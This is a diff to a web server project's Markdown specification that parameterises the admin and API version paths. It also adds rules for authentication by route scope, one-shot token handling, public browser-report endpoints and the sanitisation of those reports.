   ← { "ok": true, "data": { "qr_code": "base64", "secret": "JBSWY3DPEHPK3PXP", "recovery_keys": [] } }
 ```
 
@@ -51612,7 +53482,7 @@ server:
       bind_dn: "cn=readonly,dc=example,dc=com"
       bind_password: "{ldap_password}"
       base_dn: "dc=example,dc=com"
-      user_filter: "(uid={username})"
+      user_filter: "(uid={user_name})"
       # Map LDAP attributes to user fields
       attributes:
         username: "uid"
@@ -51648,7 +53518,7 @@ server:
 5. On next login, group membership is re-evaluated
 6. If user is removed from all `admin_groups` → admin access revoked
 
-**Admin Panel (`/admin/server/security/auth`):**
+**Admin Panel (`/{admin_path}/server/security/auth`):**
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -51799,7 +53669,7 @@ server:
 
 **Private/Disabled Mode (Admin Invite):**
 ```
-1. Admin creates invite at /admin/server/users (sets username)
+1. Admin creates invite at /{admin_path}/server/users (sets username)
 2. Admin shares invite URL with new user
 3. User clicks link → sets own password (admin cannot set)
 4. Account active
@@ -51858,7 +53728,7 @@ server:
 
 **Profile Example (API Response):**
 ```json
-GET /api/v1/users
+GET /api/{api_version}/users
 {
     "id": 12345,
     "username": "johndoe",
@@ -51885,7 +53755,7 @@ GET /api/v1/users
 
 **Public Profile Example (what others see):**
 ```json
-GET /api/v1/public/users/johndoe
+GET /api/{api_version}/public/users/johndoe
 {
     "username": "johndoe",
     "display_name": "John Doe",
@@ -52126,7 +53996,7 @@ func GetOrCreatePreferences(userID int) (*UserPreferences, error) {
 
 **Get All Settings:**
 ```json
-GET /api/v1/users/settings
+GET /api/{api_version}/users/settings
 {
     "account": {
         "display_name": "John Doe",
@@ -52164,7 +54034,7 @@ GET /api/v1/users/settings
 
 **Update Settings (partial update):**
 ```json
-PATCH /api/v1/users/settings
+PATCH /api/{api_version}/users/settings
 {
     "privacy": {
         "visibility": "public",
@@ -52209,7 +54079,7 @@ PATCH /api/v1/users/settings
 
 ## Admin Panel
 
-### /admin/server/moderation/users (User Moderation)
+### /{admin_path}/server/moderation/users (User Moderation)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -52219,7 +54089,7 @@ PATCH /api/v1/users/settings
 | Disable/Enable | Toggle | Temporarily disable account |
 | Revoke sessions | Button | Log user out everywhere |
 
-### /admin/server/moderation/users/{id} (User Detail)
+### /{admin_path}/server/moderation/users/{id} (User Detail)
 
 | Section | Contents |
 |---------|----------|
@@ -52228,7 +54098,7 @@ PATCH /api/v1/users/settings
 | Activity | Login history, API usage |
 | Actions | Disable, delete, impersonate |
 
-### /admin/server/roles (Role Management)
+### /{admin_path}/server/roles (Role Management)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -52237,7 +54107,7 @@ PATCH /api/v1/users/settings
 | Edit permissions | Checkboxes | Set role permissions |
 | Delete role | Button | Remove role (reassign users first) |
 
-### /admin/server/users/invites (User Invitation Codes)
+### /{admin_path}/server/users/invites (User Invitation Codes)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -52255,40 +54125,110 @@ PATCH /api/v1/users/settings
 | Rule | Description |
 |------|-------------|
 | **Scoped** | Routes grouped by scope: `/auth`, `/user`, `/org`, `/admin` |
-| **Mirrored** | Web (`/`) and API (`/api/v1/`) use same structure |
+| **Mirrored** | Web (`/`) and API (`/api/{api_version}/`) use same structure |
 | **Intuitive** | Simple, predictable paths |
 | **Params over queries** | Use path params, limit query params to defined cases |
 | **Duplicated when needed** | Same resource may exist in multiple scopes |
 | **Auth under /auth/** | NEVER `/login`, `/register`, `/password/*` at root - ALWAYS `/auth/login`, `/auth/register`, `/auth/password/*`, etc. |
-| **Admin scoped** | `/admin/**` requires authenticated admin - unauthenticated flows (invites) go through `/auth/` |
+| **Admin scoped** | `/{admin_path}/**` requires authenticated admin - unauthenticated flows (invites) go through `/auth/` |
 
-**Note:** `v1` defaults to `v1` but is configurable via `server.api_version` in server.yml. Do not hardcode `v1` in code.
+**Note:** `{api_version}` defaults to `v1` but is configurable via `server.api_version` in server.yml. Do not hardcode `v1` in code.
 
 ### Response Formats
 
 | Route | Default | Options |
 |-------|---------|---------|
 | `/` (web) | HTML | - |
-| `/api/v1/` | JSON (`application/json`) | JSON, Text |
-| `/api/v1/**/*.txt` | Text (`text/plain`) | - |
+| `/api/{api_version}/` | JSON (`application/json`) | JSON, Text |
+| `/api/{api_version}/**/*.txt` | Text (`text/plain`) | - |
 
 ### Scopes
 
 | Scope | Web | API | Description |
 |-------|-----|-----|-------------|
-| Public | `/**` | `/api/v1/**` | Public resources, unauthenticated (project-specific) |
-| Server Pages | `/server/` | `/api/v1/server/` | Public pages (about, help, contact, privacy, etc.) |
-| Auth | `/auth/` | `/api/v1/auth/` | Authentication flows |
-| Users | `/users/` | `/api/v1/users/` | User resources |
-| Orgs | `/orgs/` | `/api/v1/orgs/` | Organization resources |
-| Server Admin | `/admin/` | `/api/v1/admin/` | Admin panel |
-| Server Settings | `/admin/server/` | `/api/v1/admin/server/` | Server configuration within admin |
+| Public | `/**` | `/api/{api_version}/**` | Public resources, unauthenticated (project-specific) |
+| Server Pages | `/server/` | `/api/{api_version}/server/` | Public pages (about, help, contact, privacy, etc.) |
+| Auth | `/auth/` | `/api/{api_version}/auth/` | Authentication flows |
+| Users | `/users/` | `/api/{api_version}/users/` | User resources |
+| Orgs | `/orgs/` | `/api/{api_version}/orgs/` | Organization resources |
+| Server Admin | `/{admin_path}/` | `/api/{api_version}/{admin_path}/` | Admin panel |
+| Server Settings | `/{admin_path}/server/` | `/api/{api_version}/{admin_path}/server/` | Server configuration within admin |
+
+### Default Auth by Scope (Canonical Rule)
+
+**This is the default authentication requirement for every route, derived from the URL prefix. Endpoint tables that omit an "Auth" column inherit from this table. Endpoints that deviate MUST list an explicit Auth value.**
+
+#### Token Types (every Auth value in the spec resolves to one of these)
+
+| Auth value | What the caller presents | Validated against | Where issued |
+|------------|--------------------------|---------------------|--------------|
+| `None` | nothing | n/a | — public route |
+| `Session` | session cookie (browser) | `sessions` table; signed with `cookie_signing_key` (PART 11 → "Cryptographic Keys") | login flow |
+| `Bearer` | `Authorization: Bearer adm_…` / `usr_…` / `org_…` (or agent variants) | `tokens` table; SHA-256 hash compared (PART 11 → "API Token Security") | token creation flow |
+| `Reset token` | one-shot URL param (`/auth/password/reset?token=…`) | hashed in `password_resets` table; single-use; expires per `auth.password_reset_ttl` (default 1h) | `/auth/password/forgot` flow (sent via email) |
+| `Verify token` | one-shot URL param (`/auth/verify/{token}`) | hashed in `email_verifications` table; single-use; expires per `auth.email_verify_ttl` (default 48h) | sent via email on registration / email change |
+| `Invite token` | one-shot URL param (`/auth/invite/{user|server}/{token}`) | hashed in `invites` table; single-use; expires per `invites.ttl` (default 7d) | admin issues from `/{admin_path}/server/admins` (server invite) or user from `/users/orgs/{slug}/invites` (org invite) |
+| `Tracking token` | one-shot URL param (`/server/security/report/{tracking_id}?token=…`) | per-tracking-id token; single-use-per-day (researcher can refresh by re-clicking the email link); expires 30 days after report closes | sent via email when researcher submits a security report (PART 11 → "Security Reports") |
+| `Partial-session` | short-lived cookie issued mid-flow (post-password-correct, pre-2FA) | `partial_sessions` table; consumed when 2FA / recovery completes; expires per `auth.partial_session_ttl` (default 5m) | `/auth/login` flow when 2FA is required |
+
+**All one-shot tokens (`Reset`, `Verify`, `Invite`, `Tracking`, `Partial-session`) share the same construction:**
+- Generated from `crypto/rand` (32 bytes → URL-safe base64).
+- Stored ONLY as `SHA-256(token)` in DB. Plaintext exists in transit (URL/email) and in operator-side ephemeral state only.
+- Single-use unless explicitly noted (`Tracking token` is single-use-per-day).
+- Logged as `audit.{flow}_token_issued` and `audit.{flow}_token_consumed`. Token value itself is NEVER logged.
+- Wrong tokens: constant-time-compared, generic 404 on miss (no "expired vs invalid" disclosure).
+
+| Scope | Web Route | Web Auth | API Route | API Auth |
+|-------|-----------|----------|-----------|----------|
+| Public | `/` (project root, project-specific public) | None | `/api/{api_version}/` | None |
+| Server Pages | `/server/*` (about, help, contact, privacy, dpo, terms, docs/swagger, docs/graphql) | None | `/api/{api_version}/server/*` | None |
+| Auth | `/auth/*` (login, register, password/*, verify, invite, etc.) | None (most) | `/api/{api_version}/auth/*` | None (most) |
+| Users (current) | `/users/*` | Session | `/api/{api_version}/users/*` | Bearer `usr_` token |
+| Users (public profile) | `/users/{user_name}`, `/orgs/{slug}` and `/users/{user_name}/repos`, `/users/{user_name}/followers`, `/users/{user_name}/following` | None* | `/api/{api_version}/users/{user_name}`, `/api/{api_version}/users/{user_name}/repos`, etc. | None* |
+| Orgs (member) | `/orgs/{slug}/*` (non-public) | Session | `/api/{api_version}/orgs/{slug}/*` (non-public) | Bearer `usr_` (member) or `org_` token |
+| Server Admin | `/{admin_path}/*` | Session (admin) | `/api/{api_version}/{admin_path}/*` | Bearer `adm_` token |
+| Server Settings | `/{admin_path}/server/*` | Session (admin) | `/api/{api_version}/{admin_path}/server/*` | Bearer `adm_` token |
+
+**\* "None\*"** means publicly accessible but with response-field filtering: only fields the resource has marked public are returned. See PART 34 (Multi-User) and PART 35 (Organizations) for the filter rules.
+
+**Always-public exceptions (regardless of scope inheritance):**
+
+| Route | Method | Auth | Notes |
+|-------|--------|------|-------|
+| `/healthz` | GET | None | Frontend health (PART 13) |
+| `/metrics` | GET | Optional | Prometheus (may be IP-restricted in config) |
+| `/sitemap.xml`, `/robots.txt`, `/favicon.ico`, `/manifest.json`, `/.well-known/*` | GET | None | Conventional web files |
+| `/server/docs/swagger`, `/server/docs/graphql` | GET | None | Public API docs (HTML) |
+| `/api/openapi.json`, `/api/{api_version}/openapi.json` | GET | None | Public OpenAPI spec |
+| `/api/graphql`, `/api/{api_version}/graphql` | POST | None for introspection; per-operation otherwise | GraphQL — see PART 14 GraphQL section for resolver-level auth |
+| `/api/autodiscover` | GET | None | Public client/agent auto-config |
+| `/api/{api_version}/healthz` | GET | None | Public JSON health |
+| `/api/{api_version}/server/reports/*` | POST | None | Public reports sink (CSP, NEL, deprecation, intervention, crash, error, default). See PART 14 → "Public Reports Scope". Browsers cannot present credentials when emitting these reports. Rate-limited per-IP. |
+| `/server/security/policy` | GET | None | Disclosure policy page (HTML). See PART 11 → "Security Reports". |
+| `/server/security/thanks` | GET | None | Acknowledgments / hall-of-fame (HTML). See PART 11. |
+| `/server/security/report/{tracking_id}` | GET | One-shot tracking token (in URL) | Researcher status page. Token is single-use-per-day, expires 30 days after report closes. See PART 11. |
+| `/.well-known/pgp-key.asc` | GET | None | Project PGP public key for security reports. 404 until admin generates a keypair. |
+| `/server/contact?security_id=...` | GET / POST | None — but the `security_id` query param switches the form to security-report mode (no other auth) | See PART 11 → "Security Reports". Without/invalid `security_id`, behaves as the standard contact form. |
+
+**Auth-flow exceptions (within `/auth/*` and `/api/{api_version}/auth/*`):**
+
+| Route | Auth | Why |
+|-------|------|-----|
+| `/auth/login`, `/auth/register`, `/auth/password/forgot`, `/auth/password/reset`, `/auth/username/forgot`, `/auth/verify/{token}`, `/auth/invite/*/{token}`, `/auth/passkey/challenge`, `/auth/passkey/verify` | None | Pre-session entry points |
+| `/auth/logout` | Session (web) / Bearer (API) | Must know whose session to end |
+| `/auth/refresh` | Session (web) / Bearer (API) | Must have a session/token to refresh |
+| `/auth/2fa` | Partial-session (post-password, pre-2FA) | Continuation of in-progress login |
+| `/auth/recovery/use` | Partial-session OR password-recovery token | 2FA bypass during account recovery |
+
+**Project-specific public routes** (e.g., `/jokes/random`, `/quotes`, `/ip`, `/weather`) inherit `Public → None` unless the project's IDEA.md declares a write/admin endpoint.
+
+**Authoring rule:** when writing a new endpoint table, omit the Auth column ONLY if every endpoint in the table inherits from this canonical rule. As soon as ONE endpoint in the table deviates, add the Auth column for the WHOLE table.
 
 ### Public Scope Examples (Project-Specific)
 
-**The root routes `/` and `/api/v1/` return project-specific public content:**
+**The root routes `/` and `/api/{api_version}/` return project-specific public content:**
 
-| Project Type | `/` (Web) | `/api/v1/` (API) |
+| Project Type | `/` (Web) | `/api/{api_version}/` (API) |
 |--------------|-----------|------------------|
 | Jokes | Random joke (HTML) | Random joke (JSON) |
 | Weather | Current weather (HTML) | Current weather (JSON) |
@@ -52300,25 +54240,25 @@ PATCH /api/v1/users/settings
 
 | Web Route | API Route | Example Usage |
 |-----------|-----------|---------------|
-| `/ip` | `/api/v1/ip` | Return requester's IP address |
-| `/jokes/random` | `/api/v1/jokes/random` | Random joke |
-| `/weather/{location}` | `/api/v1/weather/{location}` | Weather for location |
-| `/search/{query}` | `/api/v1/search/{query}` | Public search |
+| `/ip` | `/api/{api_version}/ip` | Return requester's IP address |
+| `/jokes/random` | `/api/{api_version}/jokes/random` | Random joke |
+| `/weather/{location}` | `/api/{api_version}/weather/{location}` | Weather for location |
+| `/search/{query}` | `/api/{api_version}/search/{query}` | Public search |
 
 **Query parameter search on root routes:**
 
 | Web Route | API Route | Example Usage |
 |-----------|-----------|---------------|
-| `/?q={term}` | `/api/v1/?q={term}` | Search from root |
-| `/search?q={term}` | `/api/v1/search?q={term}` | Dedicated search route |
+| `/?q={term}` | `/api/{api_version}/?q={term}` | Search from root |
+| `/search?q={term}` | `/api/{api_version}/search?q={term}` | Dedicated search route |
 
 ```bash
 # All of these are valid search patterns:
 curl "/?q=hello"                           # Web search from root
-curl "/api/v1/?q=hello"                    # API search from root
+curl "/api/{api_version}/?q=hello"                    # API search from root
 curl "/search?q=hello"                     # Web dedicated search
-curl "/api/v1/search?q=hello"              # API dedicated search
-curl "/api/v1/search/hello"                # Path-based search (also valid)
+curl "/api/{api_version}/search?q=hello"              # API dedicated search
+curl "/api/{api_version}/search/hello"                # Path-based search (also valid)
 ```
 
 ### /api/autodiscover 
@@ -52482,21 +54422,23 @@ Both CLI and agent binaries automatically call `/api/autodiscover` when connecti
 curl -q -LSsf https://api.example.com/api/autodiscover
 ```
 
-**Note:** This endpoint is NOT versioned (`/api/autodiscover` not `/api/v1/autodiscover`) because clients need it BEFORE they know the API version.
+**Note:** This endpoint is NOT versioned (`/api/autodiscover` not `/api/{api_version}/autodiscover`) because clients need it BEFORE they know the API version.
 
 **Note:** Public routes are defined in IDEA.md for each project. They do NOT require authentication and are NOT scoped to users/orgs.
 
 ### Authentication Requirements
 
+**See "Default Auth by Scope (Canonical Rule)" earlier in this PART for the authoritative table — including always-public exceptions and the auth-flow exceptions (logout, refresh, 2fa, recovery/use, etc.). The table below is a simplified summary of the dominant case per scope; the canonical rule overrides on conflict.**
+
 | Scope | Web Auth | API Auth | Notes |
 |-------|----------|----------|-------|
 | Public | None | None | Unauthenticated access |
-| Server Pages | None | None | Public info pages (about, help, contact, privacy) |
-| Auth | None | None | Used to obtain authentication |
-| Users | Session cookie | `Authorization: Bearer {token}` | User must be logged in |
-| Orgs | Session cookie | `Authorization: Bearer {token}` | User + org membership |
-| Server Admin | Session cookie | `Authorization: Bearer {admin_token}` | Admin panel access |
-| Server Settings | Session cookie | `Authorization: Bearer {admin_token}` | Server configuration (within admin) |
+| Server Pages | None | None | Public info pages (about, help, contact, privacy, docs/swagger, docs/graphql) |
+| Auth | None (most) | None (most) | Used to obtain authentication; `/auth/logout` and `/auth/refresh` require existing session/bearer |
+| Users | Session cookie | `Authorization: Bearer {token}` (`usr_`) | User must be logged in |
+| Orgs | Session cookie | `Authorization: Bearer {token}` (`usr_` member or `org_`) | User + org membership |
+| Server Admin | Session cookie | `Authorization: Bearer {admin_token}` (`adm_`) | Admin panel access |
+| Server Settings | Session cookie | `Authorization: Bearer {admin_token}` (`adm_`) | Server configuration (within admin) |
 
 **API Token Types:**
 
@@ -52519,7 +54461,7 @@ curl -q -LSsf https://api.example.com/api/autodiscover
 
 | Cookie | Scope | Max Age | Notes |
 |--------|-------|---------|-------|
-| `admin_session` | `/admin/` | 30 days | Admin web sessions |
+| `admin_session` | `/{admin_path}/` | 30 days | Admin web sessions |
 | `user_session` | `/users/`, `/orgs/` | 7 days | User web sessions |
 
 ## Web Routes
@@ -52530,9 +54472,6 @@ curl -q -LSsf https://api.example.com/api/autodiscover
 |------|-------------|
 | `/` | Home page |
 | `/healthz` | Health check |
-| `/openapi` | Swagger UI |
-| `/graphql` | GraphiQL interface |
-
 ### Server (`/server/`)
 
 | Path | Description |
@@ -52541,6 +54480,8 @@ curl -q -LSsf https://api.example.com/api/autodiscover
 | `/server/privacy` | Privacy policy |
 | `/server/contact` | Contact form |
 | `/server/help` | Help / documentation |
+| `/server/docs/swagger` | Swagger UI (interactive REST API explorer) |
+| `/server/docs/graphql` | GraphiQL interface (interactive GraphQL explorer) |
 
 ### Auth (`/auth/`)
 
@@ -52598,340 +54539,406 @@ Organizations - only for projects with multi-user collaboration.
 | `/orgs/{slug}/security/sessions` | Active sessions (org-wide) |
 | `/orgs/{slug}/billing` | Billing & subscription (if applicable) |
 
-### Admin (`/admin/`)
+### Admin (`/{admin_path}/`)
 
 | Path | Description |
 |------|-------------|
-| `/admin` | Dashboard |
-| `/admin/profile` | Your admin account (password, API token, 2FA) |
-| `/admin/profile/preferences` | Admin preferences (theme, notifications) |
+| `/{admin_path}` | Dashboard |
+| `/{admin_path}/profile` | Your admin account (password, API token, 2FA) |
+| `/{admin_path}/profile/preferences` | Admin preferences (theme, notifications) |
 
-### Admin - Server (`/admin/server/`)
-
-| Path | Description |
-|------|-------------|
-| `/admin/server/setup` | Initial setup wizard |
-| `/admin/server/settings` | Server settings |
-| `/admin/server/branding` | Branding & SEO |
-| `/admin/server/ssl` | SSL/TLS settings |
-| `/admin/server/tor` | Tor hidden service |
-| `/admin/server/web` | Web settings (robots.txt, security.txt) |
-| `/admin/server/pages` | Standard pages (about, privacy, contact) |
-| `/admin/server/email` | Email/SMTP settings |
-| `/admin/server/email/templates` | Email templates |
-| `/admin/server/notifications` | Notification settings |
-| `/admin/server/scheduler` | Scheduled tasks |
-| `/admin/server/backup` | Backup & restore |
-| `/admin/server/logs` | Log viewer |
-| `/admin/server/roles` | Role definitions |
-| `/admin/server/users/invites` | User registration invite codes (multi-user apps) |
-
-### Admin - Server Admins (`/admin/server/admins/`)
+### Admin - Server (`/{admin_path}/server/`)
 
 | Path | Description |
 |------|-------------|
-| `/admin/server/admins` | Server admin accounts |
-| `/admin/server/admins/invite` | Invite new Server Admin (generates link) |
-| `/admin/server/admins/{id}` | Admin detail |
+| `/{admin_path}/server/setup` | Initial setup wizard |
+| `/{admin_path}/server/settings` | Server settings |
+| `/{admin_path}/server/branding` | Branding & SEO |
+| `/{admin_path}/server/ssl` | SSL/TLS settings |
+| `/{admin_path}/server/tor` | Tor hidden service |
+| `/{admin_path}/server/web` | Web settings (robots.txt, security.txt) |
+| `/{admin_path}/server/pages` | Standard pages (about, privacy, contact) |
+| `/{admin_path}/server/email` | Email/SMTP settings |
+| `/{admin_path}/server/email/templates` | Email templates |
+| `/{admin_path}/server/notifications` | Notification settings |
+| `/{admin_path}/server/scheduler` | Scheduled tasks |
+| `/{admin_path}/server/backup` | Backup & restore |
+| `/{admin_path}/server/logs` | Log viewer |
+| `/{admin_path}/server/roles` | Role definitions |
+| `/{admin_path}/server/users/invites` | User registration invite codes (multi-user apps) |
 
-### Admin - Moderation (`/admin/server/moderation/`)
+### Admin - Server Admins (`/{admin_path}/server/admins/`)
 
 | Path | Description |
 |------|-------------|
-| `/admin/server/moderation/users` | User moderation |
-| `/admin/server/moderation/users/{id}` | User detail |
-| `/admin/server/moderation/orgs` | Org moderation |
-| `/admin/server/moderation/orgs/{slug}` | Org detail |
+| `/{admin_path}/server/admins` | Server admin accounts |
+| `/{admin_path}/server/admins/invite` | Invite new Server Admin (generates link) |
+| `/{admin_path}/server/admins/{id}` | Admin detail |
+
+### Admin - Moderation (`/{admin_path}/server/moderation/`)
+
+| Path | Description |
+|------|-------------|
+| `/{admin_path}/server/moderation/users` | User moderation |
+| `/{admin_path}/server/moderation/users/{id}` | User detail |
+| `/{admin_path}/server/moderation/orgs` | Org moderation |
+| `/{admin_path}/server/moderation/orgs/{slug}` | Org detail |
 
 ## API Routes
 
-### Public (`/api/v1/`)
+### Public (`/api/{api_version}/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/healthz` | GET | Health check |
+| `/api/{api_version}/healthz` | GET | Health check |
+| `/api/{api_version}/openapi.json` | GET | OpenAPI spec for this specific version |
+| `/api/{api_version}/graphql` | POST | GraphQL endpoint for this specific version |
+| `/api/openapi.json` | GET | OpenAPI spec for the current `{api_version}` (served directly, no redirect) |
+| `/api/graphql` | POST | GraphQL endpoint for the current `{api_version}` (served directly, no redirect) |
 
-**Note:** `/openapi.json` is a root-level endpoint (not `/api/v1/openapi.json`). See PART 14.
+**Note:** Swagger and GraphQL specs/endpoints are versioned and live under `/api/{api_version}/`. The unversioned `/api/openapi.json` and `/api/graphql` aliases serve the current `{api_version}` directly so clients don't need to track the version. The Swagger UI and GraphiQL HTML pages are frontend and live at `/server/docs/swagger` and `/server/docs/graphql`. See PART 14.
 
-### Server (`/api/v1/server/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/server/about` | GET | About information |
-| `/api/v1/server/privacy` | GET | Privacy policy |
-| `/api/v1/server/contact` | POST | Submit contact form |
-| `/api/v1/server/help` | GET | Help content |
-
-### Auth (`/api/v1/auth/`)
+### Server (`/api/{api_version}/server/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/auth/register` | POST | Register new user |
-| `/api/v1/auth/login` | POST | User login (returns session or 2FA challenge) |
-| `/api/v1/auth/logout` | POST | User logout |
-| `/api/v1/auth/2fa` | POST | Complete 2FA verification |
-| `/api/v1/auth/passkey/challenge` | POST | Get WebAuthn challenge |
-| `/api/v1/auth/passkey/verify` | POST | Verify WebAuthn response |
-| `/api/v1/auth/password/forgot` | POST | Request password reset (sends email) |
-| `/api/v1/auth/password/reset` | POST | Set new password (with token from email) |
-| `/api/v1/auth/username/forgot` | POST | Request username reminder (sends email) |
-| `/api/v1/auth/recovery/use` | POST | Use recovery key (2FA bypass) |
-| `/api/v1/auth/verify` | POST | Verify email address |
-| `/api/v1/auth/refresh` | POST | Refresh session/token |
-| `/api/v1/auth/invite/user/{token}` | GET | Validate user invite token |
-| `/api/v1/auth/invite/user/{token}` | POST | Complete user invite (set username, password) |
-| `/api/v1/auth/invite/server/{token}` | GET | Validate Server Admin invite token |
-| `/api/v1/auth/invite/server/{token}` | POST | Complete admin invite (set username, password) |
-| `/api/v1/auth/oidc/{provider}` | GET | Get OIDC authorization URL |
-| `/api/v1/auth/oidc/{provider}/callback` | POST | Exchange OIDC code for session |
-| `/api/v1/auth/ldap` | POST | LDAP authentication |
+| `/api/{api_version}/server/about` | GET | About information |
+| `/api/{api_version}/server/privacy` | GET | Privacy policy |
+| `/api/{api_version}/server/contact` | POST | Submit contact form |
+| `/api/{api_version}/server/help` | GET | Help content |
 
-### Users (`/api/v1/users/`)
+### Public Reports Scope (`/api/{api_version}/server/reports/`)
+
+**Canonical home for browser-emitted and operator-emitted public reports. ALL public report endpoints live under this scope so the API stays organized and discoverable. Reports are append-only sinks — POSTed by browsers and clients, never queried by them.**
+
+**Path pattern:** `/api/{api_version}/server/reports/{name}` — the `{name}` segment identifies the report type. Adding a new report type means adding a new `{name}` here, NOT inventing a new top-level path.
+
+**Auth:** None (browsers cannot present credentials when emitting these reports). Rate-limited per-IP to prevent flooding. Bodies are accepted but never echoed back.
+
+**Default report types:**
+
+| Endpoint | Method | Body Content-Type | Source / Triggered by |
+|----------|--------|-------------------|----------------------|
+| `/api/{api_version}/server/reports/csp` | POST | `application/csp-report` (legacy) or `application/reports+json` | CSP violation in the browser. See PART 11 → "Content Security Policy". |
+| `/api/{api_version}/server/reports/nel` | POST | `application/reports+json` | Network Error Logging — TLS failures, DNS failures, etc. |
+| `/api/{api_version}/server/reports/deprecation` | POST | `application/reports+json` | Browser deprecation warnings (Reporting API). |
+| `/api/{api_version}/server/reports/intervention` | POST | `application/reports+json` | Browser interventions (e.g., autoplay blocked). |
+| `/api/{api_version}/server/reports/crash` | POST | `application/reports+json` | Page crash reports (Reporting API). |
+| `/api/{api_version}/server/reports/error` | POST | `application/json` | Frontend JS error reports (`window.onerror`, unhandled rejections). |
+| `/api/{api_version}/server/reports/default` | POST | `application/reports+json` | Catch-all for the `default` reporting group declared in the `Report-To` header (see PART 11). |
+
+**All endpoints:**
+
+| Behavior | Detail |
+|----------|--------|
+| Response | `204 No Content` on success, `400` on malformed body, `429` if rate-limited |
+| Logging | Each report writes one entry to `security.log` (CSP/NEL/error) or `server.log` (deprecation/intervention/crash) — see PART 11 log events |
+| Rate limit | Per-IP, configurable via `web.csp.reports_sample_rate` (CSP) and `web.reports.rate_limit_per_minute` (other types). Default 60/min/IP. |
+| Storage | Append to log only. Reports do NOT touch the application database — they are operational telemetry, not user data. |
+| Operator visibility | Admin panel `/{admin_path}/server/reports/*` views show recent entries with filtering by type, time range, and source IP/origin. Admin views are bearer-auth (the public POST endpoints are not). |
+
+**Authoring rule for new public reports:** if the project (or a third-party browser feature) needs to add a new public POST sink for telemetry, ALWAYS add it as `/api/{api_version}/server/reports/{new_name}` — never invent a new top-level path. This keeps the API tree predictable and the rate-limit / auth / logging policy uniform.
+
+### Sanitization Rules (apply to EVERY incoming report before logging)
+
+**Reports come from untrusted browsers. The browser-supplied fields can leak operator/user secrets if logged verbatim. Run every report through the canonical Output Sanitization Pipeline (PART 11 → "Output Sanitization Pipeline") plus the report-specific rules below before writing to any log or storage.**
+
+**Per-field sanitization:**
+
+| Field (any report type) | Rule |
+|-------------------------|------|
+| `document-uri`, `referrer`, `blocked-uri`, `source-file`, `url`, any URL-shaped field | Strip the query string entirely (keep scheme + host + path). Then run param redaction from PART 11 step 2 in case any sensitive token slipped into the path. |
+| `script-sample`, `error.message`, `body.message`, any free-text field | Truncate to 200 chars after PART 11 sanitization. |
+| `error.stack`, any stack-trace field | Strip absolute filesystem paths (regex `/[^\s:]+/`); keep only the basename. Truncate to 2 KB. |
+| User-Agent | Keep verbatim — already public information the browser sends to every site. |
+| Source IP | Hash with a daily-rotating salt before storage IF the deployment's `privacy.hash_report_ips: true` is set (default `true` in EU deployments per GDPR; `false` elsewhere). Raw IP retained only in the rate-limit ring buffer (memory only, never persisted). |
+| Any field NOT in the allow-list per the report-type schema | Dropped. (Defense in depth — browser vendors add fields over time; we don't auto-trust new ones.) |
+
+**Cross-report rules:**
+
+| Rule | Detail |
+|------|--------|
+| Allow-list per report type | `csp` accepts the W3C CSP-report fields only; `nel` accepts the NEL spec fields only; `error` accepts `{message, source, lineno, colno, stack}` only. Anything else is dropped before logging. |
+| No echo, ever | Response body is always `{"ok": true}` (or 204 No Content). NEVER reflect any field from the request body in the response. |
+| No user identifier correlation | Reports are NOT joined with any logged-in user — even if the browser was authenticated when emitting the report. They are anonymous operational telemetry. |
+| No DB writes | Reports go to log files only (`security.log` for csp/nel/error, `server.log` for the rest). They do not touch the application database. |
+| Admin views run the same sanitization | The `/{admin_path}/server/reports/*` admin views display the *already-sanitized* log entries. There is no "raw" view, even for admins. |
+| Sample to prevent flood | High-volume types (csp from a misbehaving extension, nel from a flaky network) are dropped above the rate limit, NEVER buffered to disk first. |
+
+**Why the no-echo / no-correlation / no-DB rules:** a malicious extension or page in another tab could trigger reports on our domain. Treating reports as "trusted because they come from our origin" is wrong — the browser is the trust boundary, and the browser's contents are attacker-controlled. By keeping reports anonymous, append-only, log-only, and never echoed, a poisoned report cannot corrupt application state, leak another user's data, or escalate.
+
+### Auth (`/api/{api_version}/auth/`)
+
+**Most auth endpoints are pre-session entry points. The non-default ones (logout, refresh, 2fa, recovery/use) are listed with explicit Auth values per the canonical rule.**
+
+| Endpoint | Method | Auth | Description |
+|----------|--------|------|-------------|
+| `/api/{api_version}/auth/register` | POST | None | Register new user |
+| `/api/{api_version}/auth/login` | POST | None | User login (returns session or 2FA challenge) |
+| `/api/{api_version}/auth/logout` | POST | Bearer | User logout |
+| `/api/{api_version}/auth/2fa` | POST | Partial-session (post-password) | Complete 2FA verification |
+| `/api/{api_version}/auth/passkey/challenge` | POST | None | Get WebAuthn challenge |
+| `/api/{api_version}/auth/passkey/verify` | POST | None | Verify WebAuthn response |
+| `/api/{api_version}/auth/password/forgot` | POST | None | Request password reset (sends email) |
+| `/api/{api_version}/auth/password/reset` | POST | Reset token | Set new password (with token from email) |
+| `/api/{api_version}/auth/username/forgot` | POST | None | Request username reminder (sends email) |
+| `/api/{api_version}/auth/recovery/use` | POST | Partial-session OR recovery token | Use recovery key (2FA bypass) |
+| `/api/{api_version}/auth/verify` | POST | Verify token | Verify email address |
+| `/api/{api_version}/auth/refresh` | POST | Bearer | Refresh session/token |
+| `/api/{api_version}/auth/invite/user/{token}` | GET | Invite token | Validate user invite token |
+| `/api/{api_version}/auth/invite/user/{token}` | POST | Invite token | Complete user invite (set username, password) |
+| `/api/{api_version}/auth/invite/server/{token}` | GET | Invite token | Validate Server Admin invite token |
+| `/api/{api_version}/auth/invite/server/{token}` | POST | Invite token | Complete admin invite (set username, password) |
+| `/api/{api_version}/auth/oidc/{provider}` | GET | None | Get OIDC authorization URL |
+| `/api/{api_version}/auth/oidc/{provider}/callback` | POST | None | Exchange OIDC code for session |
+| `/api/{api_version}/auth/ldap` | POST | None | LDAP authentication |
+
+### Users (`/api/{api_version}/users/`)
 
 **No ID required - app knows current user from session/token.**
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/users` | GET | Current user's profile |
-| `/api/v1/users` | PATCH | Update current user's profile |
-| `/api/v1/users/tokens` | GET | List user's API tokens |
-| `/api/v1/users/tokens` | POST | Create API token |
-| `/api/v1/users/tokens/{token_id}` | GET | Get token details |
